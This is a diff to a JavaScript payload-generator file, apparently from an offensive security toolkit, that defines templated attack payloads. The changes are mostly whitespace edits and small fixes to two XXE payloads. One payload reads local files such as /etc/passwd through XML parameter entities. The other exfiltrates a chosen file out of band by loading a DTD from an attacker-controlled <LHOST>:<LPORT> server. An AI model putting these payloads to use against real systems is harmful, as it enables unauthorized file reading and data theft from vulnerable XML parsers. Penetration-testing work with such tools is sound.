@@ -16,7 +16,7 @@ var question = function(val){
 	questions.push(val);
 }
 
-/* 
+/*
 ###########################################
 ############### Payloads ##################
 ###########################################
@@ -26,7 +26,7 @@ var question = function(val){
 
 Required: title, payload, and category
 Optional: callback (used for prompt variable)
-	
+
 	Ex:
 
 	callback: function(bro){
@@ -40,9 +40,9 @@ Optional: callback (used for prompt variable)
 * If variables aren't added properly, they will not work
 * Variables can include instructions if needed.
 * Instructions should be kept in parenthesis
-	
+
 	ex: foobar <RHOST> <LHOST> <LPORT>
-	ex: foobar <RHOST (hostname)> <RPORT>	 
+	ex: foobar <RHOST (hostname)> <RPORT>
 
 
 */
@@ -74,7 +74,7 @@ Load({
 
 Load({
 	title: "XXE (Local File Read using parameter entities)",
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/inline.dtd\">%dtd; ]><methodCall><methodName>&xxe;</methodName></methodCall>",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/inline\">%dtd; ]><methodCall><methodName>&xxe;</methodName></methodCall>",
 	callback: function(bro){
 	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
 	  question(ask.http);
@@ -88,7 +88,7 @@ Load({
 
 Load({
 	title: "XXE (Out of Band File Exfiltration using parameter entities)",
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send.dtd\">%dtd;%send; ]]>",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send\">%dtd;%send;]>",
 	callback: function(bro){
 		question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
 		question(ask.http);
